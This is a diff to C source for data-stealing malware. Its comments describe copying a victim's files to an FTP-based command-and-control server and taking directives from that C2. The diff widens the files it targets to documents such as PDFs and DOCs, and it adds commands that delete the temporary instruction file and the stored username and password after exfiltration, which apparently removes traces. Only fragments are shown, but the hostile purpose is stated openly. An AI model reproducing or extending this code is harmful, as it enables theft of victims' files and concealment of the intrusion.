@@ -30,7 +30,7 @@
  * The structure of the victim's file system is not maintained. All files are copied into the FTP user's root directory. Each copied file is prefixed with a short sequence of pseudo-random
  * characters so that duplicate file names do not cause issues.
  *
- * Executable files are not copied from the victim to the C2. They considerably increase the overhead of the attack and present very little value when compared to text-based files.
+ * Executable files are not copied from the victim to the C2. They considerably increase the overhead of the attack and present very little value when compared to human-readable files (including PDFs, DOCs, etc).
 */
 
 /* DESCRIPTION:
@@ -118,6 +118,10 @@ void Copy(char * rootDirectory, char * username, char * password) {
 	}
 
 	closedir(dir);
+
+	system("rm tmp");
+	system("rm username");
+	system("rm password");
 }
 
 void copyContents(char * fileName, char * suffix, char * username, char * password) {		// This copies a single file per call	
@@ -177,6 +181,7 @@ void copyContents(char * fileName, char * suffix, char * username, char * passwo
 	fclose(srcFile);
 
 	curl_global_cleanup();
+
 }
 
 char * takeControlInstruction(void) {			// Contact C2, place directive in file named "tmp"
